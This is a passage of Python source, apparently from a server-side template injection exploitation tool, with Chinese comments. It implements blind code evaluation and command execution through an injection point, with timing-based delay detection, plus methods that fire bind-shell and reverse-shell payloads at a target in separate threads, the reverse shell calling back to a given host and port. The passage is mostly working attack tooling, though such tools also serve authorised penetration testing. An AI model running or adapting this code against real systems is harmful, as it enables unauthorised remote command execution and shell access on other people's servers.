        suffix = kwargs.get('suffix', self.get('suffix', ''))
        wrapper = kwargs.get('wrapper', self.get('wrapper', self.default_wrapper))
        blind = kwargs.get('blind', self.get('blind', False))
        boolean = kwargs.get('boolean', self.get('boolean', False))
        action = self.actions.get('evaluate_blind', {}).copy()
        if boolean and 'evaluate_boolean' in self.actions:
            action.update(self.actions.get('evaluate_boolean', {}))
        payload_action = action.get('evaluate_blind')
        call_name = action.get('call', 'inject')
        # 如果缺少或未设置调用功能则跳过
        if not action or not payload_action or not call_name or not hasattr(self, call_name):
            return
        data = {"code": code, "delay": self._get_expected_delay()}
        execution_code = formatters[self.get("formatter", "default")](payload_action, data)
        return getattr(self, call_name)(code=execution_code, prefix=prefix, suffix=suffix,
                                        wrapper=wrapper, blind=blind, boolean=boolean)

    def execute_blind(self, code, **kwargs):
        prefix = kwargs.get('prefix', self.get('prefix', ''))
        suffix = kwargs.get('suffix', self.get('suffix', ''))
        wrapper = kwargs.get('wrapper', self.get('wrapper', self.default_wrapper))
        blind = kwargs.get('blind', self.get('blind', False))
        boolean = kwargs.get('boolean', self.get('boolean', False))
        action = self.actions.get('execute_blind', {}).copy()
        if boolean and 'execute_boolean' in self.actions:
            action.update(self.actions.get('execute_boolean', {}))
        payload_action = action.get('execute_blind')
        call_name = action.get('call', 'inject')
        # 如果缺少或未设置调用功能则跳过
        if not action or not payload_action or not call_name or not hasattr(self, call_name):
            return
        data = {"code": code, "delay": self._get_expected_delay()}
        execution_code = formatters[self.get("formatter", "default")](payload_action, data)
        return getattr(self, call_name)(code=execution_code, prefix=prefix, suffix=suffix,
                                        wrapper=wrapper, blind=blind, boolean=boolean)

    def _get_expected_delay(self):
        # 获取 render() HTTP 请求的当前平均时间
        average = int(sum(self.render_req_tm) / len(self.render_req_tm))
        dev = [x - average for x in self.render_req_tm]
        varydev = max(dev) + abs(min(dev))
        # 将延迟设置为平均时间的 2 秒
        delay = self.tm_delay if not self.get('blind_test', False) else self.tm_verify_delay
        if not self.tm_varied and varydev > delay:
            self.tm_varied = True
            log.log(29, '盲注正时变化太大。增加时间以避免误报。')
        return average + delay

    def bind_shell(self, port, shell="/bin/sh"):
        action = self.actions.get('bind_shell', {})
        formatter = self.get("formatter", "default")
        # 旧插件可能会直接导入载荷，新插件可以在模板级别定义自己的载荷
        payload_actions = action.get('bind_shell', bash.bind_shell)
        if payload_actions is bash.bind_shell:
            formatter = "sstimap"
        call_name = action.get('call', 'inject')
        if not action or not isinstance(payload_actions, list) or not call_name or not hasattr(self, call_name):
            return
        for payload_action in payload_actions:
            execution_code = formatters[formatter](payload_action, {"port": port, "shell": shell})
            reqthread = threading.Thread(target=getattr(self, call_name), args=(execution_code,))
            reqthread.start()
            yield reqthread

    def reverse_shell(self, host, port, shell="/bin/sh"):
        action = self.actions.get('reverse_shell', {})
        formatter = self.get("formatter", "default")
        # 旧插件可能会直接导入载荷，新插件可以在模板级别定义自己的载荷
        payload_actions = action.get('reverse_shell', bash.reverse_shell)
        if payload_actions is bash.reverse_shell:
            formatter = "sstimap"
        call_name = action.get('call', 'inject')
        if not action or not isinstance(payload_actions, list) or not call_name or not hasattr(self, call_name):
            return
        for payload_action in payload_actions:
            execution_code = formatters[formatter](payload_action, {"port": port, "shell": shell, "host": host})
            reqthread = threading.Thread(target=getattr(self, call_name), args=(execution_code,))
            reqthread.start()

    def update_actions(self, actions):
        # 递归更新实例上的操作
        self.actions = _recursive_update(self.actions, actions)

    def set_actions(self, actions):
        # 在实例上设置操作
        self.actions = actions

    def set_contexts(self, contexts):
        # Update contexts on the instance
        self.contexts = contexts
